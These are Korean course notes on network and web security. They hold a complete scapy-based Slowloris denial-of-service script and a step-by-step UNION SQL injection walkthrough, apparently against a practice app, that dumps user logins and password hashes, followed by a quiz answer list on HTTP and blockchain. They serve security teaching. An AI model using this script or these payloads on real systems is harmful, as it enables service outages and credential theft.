2019.12.11.



# IT서비스와 보안

## 1.  네트워크 보안



### - scapy

- 파이썬으로 작성된 패킷 조작 도구
- 패킷 디코딩, 전송, 캡처, 수정 등 다양한 기능을 제공



### - 참고

- ARP Spoofing ⇒ https://myanjini.tistory.com/76
- MTM(Man in The Middle) attack ⇒ https://myanjini.tistory.com/77
- Port Scanning ⇒ https://myanjini.tistory.com/75
- scapy 사용법 ⇒ https://myanjini.tistory.com/78
- scapy를 이용한 3-way handshaking ⇒ https://myanjini.tistory.com/79
- TCP SYN Flooding ⇒ https://myanjini.tistory.com/80



### - Slowloris Attack

- HTTP 요청 헤더와 본문이 개행문자로 구분되는 특징을  이용한 공격
- 헤더의 끝을 나타내는 개행문자를 전달하지 않아 서버가  연결을 유지하도록 하는 공격



- kali#2에서 slowloris.py 파일을 생성

~~~

#! /usr/bin/env python

import sys
import time
from scapy.all import *

def slowloris (target, num) :
    print "start connect > {}".format(target)
    syn = []
    for i in range(num) :
        syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
    syn_ack = sr(syn, verbose=0)[0]

    ack = []
    for sa in syn_ack :
        payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
        "Host: {}\r\n".format(target) +\
        "User-Agent: Mozilla/4.0\r\n" +\
        "Content-Length: 42\r\n"

        ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
    
    answer = sr(ack, verbose=0)[0]
    print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
    print "Sending data \"X-a: b\\r\\n\".."

    count = 1
    while True :
        print "{} time sending".format(count)
        ack = []
        for ans in answer :
            ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
        answer = sr(ack, inter=0.5, verbose=0)[0]
        time.sleep(10)
        count += 1

if __name__ == "__main__" :
    if len(sys.argv) < 3 :
        print "Usage: {} <target> <number of connection>".format(sys.argv[0])
        sys.exit(1)
    slowloris(sys.argv[1], int(sys.argv[2]))
~~~



### - 영화조회 서비스 SQL Injection

~~~
[화면]
제목 : man

[전달 ← 요청 파라미터를 통해서 전달]
sqli_1.php?title=man

[사용 → 쿼리문을 만드는데 사용될 것으로 유추]
select * from movies where title = '%man%' 


##1 입력값이 전달 및 사용 과정에서 아무런 조작이 발생하지 않는지 궁금???
[화면]
제목 : man'

[전달 ← 요청 파라미터를 통해서 전달]
sqli_1.php?title=man'

[사용 → 쿼리문을 만드는데 사용될 것으로 유추]
select * from movies where title = '%man'%' 
⇒ Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
→ 백엔드 DB가 MySQL라는 정보와 화면에서 입력한 값은 그대로 쿼리 생성 및 실행에 사용된다.

##2 정상적인 쿼리가 반환하는 컬럼의 개수를 확인
select * from movies where title = '%man' order by 1 -- %' ← 제목이 man으로 끝나는 영화를 조회해서 첫번째 컬럼으로 정렬

select * from movies where title = '%man' order by 2 -- %'
			:
select * from movies where title = '%man' order by 8 -- %'
⇒ Error: Unknown column '8' in 'order clause'
→ 정상적인 쿼리가 반환하는 컬럼의 개수는 7개이다.

##3 정상적인 쿼리의 실행 결과에 공격자가 원하는 쿼리의 실행 결과를 결합해서 화면에 출력
select * from movies where title = '%man' UNION select 1,2,3,4,5,6,7 -- %'

⇒ 파란색은 정상적인 쿼리(man으로 끝나는 제목의 영화)의 실행결과
⇒ 붉은색은 공격자가 궁금해하는 쿼리의 실행결과
→ 화면 출력을 위해서는 쿼리 실행 결과에서 2, 3, 4, 5번째 컬럼의 정보만 사용

##4 MySQL의 시스템 테이블을 이용해서 사용자 정의 테이블의 정보(이름)을 조회
select * from movies where title = '%man' UNION select 1,table_schema,table_name,4,5,6,7 from information_schema.tables -- %'
→ https://dev.mysql.com/doc/refman/8.0/en/tables-table.html 참조

##5 테이블 이름이 users인 테이블이 가지고 있는 컬럼 정보를 조회
select * from movies where title = '%man' UNION select 1,table_name,column_name,4,5,6,7 from information_schema.columns where table_name = 'users' -- %'
→ https://dev.mysql.com/doc/refman/8.0/en/columns-table.html 참조

##6 users 테이블 id, login, password, email, secret 컬럼의 정보를 조회
select * from movies where title = '%man' UNION select 1,id,login,password,concat(email, " : ", secret),6,7 from users -- %'

##7 패스워드 정보가 안전하게 저장되어 있는지 확인
6885858486f31043e5839c735d99457f045affd0
https://crackstation.net/
~~~

### - 문제 풀이

1.  HTTP 요청 방식 중 PUT은 본문을 필요로 한다.

2. 응답 코드 4XX는  Client Side Error

   - 영구적 리다이렉트되는 경우 도메인 주소가 바뀐다(ex. 회사의 도메인이 바뀜)
   - 임시적 리다이렉트되는 경우 서버 폭주를 우려해서 임시사이트를 제공 할 때(한시적 사용)

3. Content-Length 헤더 값을 크게 주고 본문을 천천히 줌 => RUDY ATTACK

4. GET GET POST POST 

5. 302 moved tmp / 리다이렉트

6. HTTP의  헤더를 조작 슬로로리스 공격

7. HTTP 기본 인증 방식 Base64 인코딩/디코딩

8. HTTP 2xx : 성공

9. HEAD  : 자원의 상태만 요청

10. 정형화되지 않은 자료를 서버로 전달할 때 사용하는 Content-Type : multipart/form-data

11. 블록 생성 독점을 막기위한 도구 : 난이도

12. P2P 네트워크의 악의적 사용자를 막기위한 도구 : 전자서명, 장부공유, 블록해쉬

13. 비트코인의 블록헤더

14. 블록에 포함된 거래의 요약 정보 : 머클루트

15. 퍼블릭 블록체인의 특징 : 마이닝 보수가 필요 함

16. 해쉬의 특징 : 유일성, 단방향성, 충돌회피

17. 블록체인의 특징 : 거래 기록의 작성 시점을 객곽적으로 알 수 있음

18. 블록헤더 중 유일하게 변경 할 수 있는 값 : nonce

19. 작업증명 알고리즘의 에너지 문제 해결 : Pos

20. 머클트리

21. 서명 = 송신자의 개인키 암호화, 송신자의 공개키로 복호화

22. 관리자 그룹 : administrators

23. 3way - Handshaking SYN > SYN+ACK > ACK

24. Linux 권한설정

25. 패스워드 관리규칙

26. Linux shadow 파일

27. 윈도우 시스템 관리자 그룹 net localgroup administrators

28. 보안의 3요소 : 기밀성, 무결성, 가용성

29. 해쉬 = 무결성 보장

30. 지식기반 인증 : 내가 알고 있는것, 패스워드

    소유기반 인증 : 매체, 출입증 카드

    특징기반 인증 : 지문, 홍채, 서체, 정맥